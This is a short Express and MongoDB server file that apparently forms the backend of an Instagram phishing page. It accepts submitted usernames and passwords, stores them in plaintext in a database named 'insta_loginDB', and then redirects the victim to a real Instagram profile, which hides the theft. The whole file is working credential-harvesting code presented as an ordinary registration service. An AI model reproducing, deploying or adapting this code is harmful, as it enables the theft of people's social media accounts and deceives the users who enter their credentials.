const express =require("express");
const  mongoose =require("mongoose");
const bodyParser =require("body-parser");
const dotenv =require("dotenv");
 const path = require("path");

const app=express();

dotenv.config();

const port =process.env.PORT || 3000;
app.use(express.static(path.join(__dirname, 'public')));

const username =process.env.MONGODB_USERNAME;
const password =process.env.MONGODB_PASSWORD;
mongoose.connect(`mongodb+srv://${username}:${password}@cluster0.e1efv.mongodb.net/insta_loginDB`,{
    useNewUrlParser :true,
    useUnifiedTopology :true,
});

const registrationSchema =new mongoose.Schema({
    name:String,
    password:String
});

const Registration = mongoose.model("Registration",registrationSchema);

app.use(bodyParser.json());

app.get("/", (req,res) => {
    res.sendFile(__dirname + "/index.html");
})

app.post("/register",async (req,res) => {
try{
    const {name,password} = req.body;
    const registrationData =new Registration({
        name,
        password

    });
     await registrationData.save();
     res.redirect("https://www.instagram.com/mahi7781/?hl=en");
}
catch(error) {
    console.log(error);
}
})
app.listen(port,()=>{
    console.log("");
})

